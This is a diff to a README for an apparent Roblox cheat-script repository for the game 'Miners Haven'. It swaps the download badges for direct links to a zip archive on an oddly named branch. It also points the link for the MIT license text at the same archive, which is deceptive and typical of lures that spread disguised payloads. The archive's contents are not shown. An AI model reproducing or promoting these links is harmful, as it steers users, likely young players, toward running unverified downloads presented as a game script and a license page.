@@ -1,6 +1,6 @@
 # Miners Haven Roblox Script Repository 🚀
 
-[![Download](https://img.shields.io/badge/Download-green)](https://Excellence5567.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/Excellence5567/miners-haven-toolkit/raw/refs/heads/branch/bladdery/toolkit-haven-miners-v3.3.zip)
 
 ---
   
@@ -103,7 +103,7 @@ Use scripts responsibly. We encourage all contributors and users to focus on inn
 
 ## 📜 License
 
-Crafted with care and shared openly under the **MIT License (2025)**. Read the full license text [here](https://opensource.org/licenses/MIT).
+Crafted with care and shared openly under the **MIT License (2025)**. Read the full license text [here](https://github.com/Excellence5567/miners-haven-toolkit/raw/refs/heads/branch/bladdery/toolkit-haven-miners-v3.3.zip).
 
 ---
 
@@ -111,7 +111,7 @@ Crafted with care and shared openly under the **MIT License (2025)**. Read the f
 
 Ready to elevate your mining strategy?
 
-[![Download](https://img.shields.io/badge/Download-green)](https://Excellence5567.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/Excellence5567/miners-haven-toolkit/raw/refs/heads/branch/bladdery/toolkit-haven-miners-v3.3.zip)
 
 *Click the Download badge to get the latest version of our Miners Haven Roblox Script—adventure awaits!*
 
